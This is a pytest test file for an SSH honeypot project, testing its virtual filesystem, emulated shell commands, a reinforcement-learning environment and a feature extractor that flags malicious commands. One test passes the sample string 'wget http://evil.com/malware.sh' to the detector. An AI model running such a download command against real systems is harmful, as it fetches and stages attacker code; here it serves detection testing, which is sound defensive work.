"""Test cases to check functionality"""
import pytest
import asyncio
from unittest.mock import Mock, patch

from rassh.core.config import AppConfig, HoneypotConfig, DatabaseConfig, RLConfig
from rassh.core.filesystem import VirtualFilesystem, FileNode
from rassh.commands.base import CommandProcessor, LSCommand
from rassh.rl.environment import HoneypotEnvironment
from rassh.rl.utils import CommandFeatureExtractor


@pytest.fixture
def test_config():
    """Create test configuration."""
    return AppConfig(
        honeypot=HoneypotConfig(
            hostname="test-honeypot",
            listen_port=2223,
            filesystem_file="test_filesystem.pickle"
        ),
        database=DatabaseConfig(
            host="localhost",
            username="test",
            password="test",
            database="test_db"
        ),
        rl=RLConfig(
            learning_rate=0.01,
            epsilon=0.1
        )
    )


@pytest.fixture
def test_filesystem(tmp_path):
    """Create test virtual filesystem."""
    fs_file = tmp_path / "test_fs.pickle"
    return VirtualFilesystem(fs_file)


class TestVirtualFilesystem:
    
    def test_create_directory(self, test_filesystem):
        """Test directory creation."""
        test_filesystem._create_directory("/test/dir")
        assert test_filesystem.is_directory("/test/dir")
        assert test_filesystem.file_exists("/test/dir")
    
    def test_create_file(self, test_filesystem):
        """Test file creation."""
        test_filesystem._create_file("/test/file.txt", "test content")
        assert test_filesystem.file_exists("/test/file.txt")
        assert not test_filesystem.is_directory("/test/file.txt")
        assert test_filesystem.read_file("/test/file.txt") == "test content"
    
    def test_list_directory(self, test_filesystem):
        """Test directory listing."""
        test_filesystem._create_directory("/test")
        test_filesystem._create_file("/test/file1.txt", "content1")
        test_filesystem._create_file("/test/file2.txt", "content2")
        
        contents = test_filesystem.list_directory("/test")
        assert "file1.txt" in contents
        assert "file2.txt" in contents


class TestCommandProcessor:
    
    @pytest.fixture
    def command_processor(self, test_filesystem):
        """Create test command processor."""
        mock_db = Mock()
        return CommandProcessor(mock_db, test_filesystem)
    
    @pytest.mark.asyncio
    async def test_ls_command(self, command_processor, test_filesystem):
        """Test ls command."""
        # Setup test directory
        test_filesystem._create_directory("/test")
        test_filesystem._create_file("/test/file1.txt", "content")
        test_filesystem._create_file("/test/file2.txt", "content")
        
        result = await command_processor.process_command("ls /test", "/")
        assert "file1.txt" in result
        assert "file2.txt" in result
    
    @pytest.mark.asyncio
    async def test_cat_command(self, command_processor, test_filesystem):
        """Test cat command."""
        test_filesystem._create_file("/test.txt", "test content")
        
        result = await command_processor.process_command("cat /test.txt", "/")
        assert result == "test content"
    
    @pytest.mark.asyncio
    async def test_unknown_command(self, command_processor):
        """Test unknown command handling."""
        result = await command_processor.process_command("unknowncmd", "/")
        assert "command not found" in result


class TestRLEnvironment:
    
    def test_environment_creation(self):
        env = HoneypotEnvironment()
        assert env.action_space.n == 5
        assert env.observation_space.shape == (10,)
    
    def test_reset(self):
        env = HoneypotEnvironment()
        observation, info = env.reset()
        assert observation.shape == (10,)
        assert isinstance(info, dict)
    
    def test_step(self):
        env = HoneypotEnvironment()
        env.reset()
        
        observation, reward, terminated, truncated, info = env.step(0)
        assert observation.shape == (10,)
        assert isinstance(reward, float)
        assert isinstance(terminated, bool)
        assert isinstance(info, dict)


class TestCommandFeatureExtractor:
    """command feature extraction."""
    
    def test_feature_extraction(self):
        extractor = CommandFeatureExtractor()
        
        features = extractor.extract_features("wget http://evil.com/malware.sh")
        assert features[0] > 0  # Length feature
        assert features[4] > 0  # wget pattern
        assert features[16] > 0  # HTTP pattern
        
        # Test benign command
        features = extractor.extract_features("ls -la")
        assert features[0] > 0  # Length feature
        assert all(features[4:14] == 0)  # No malicious patterns


if __name__ == "__main__":
    pytest.main([__file__])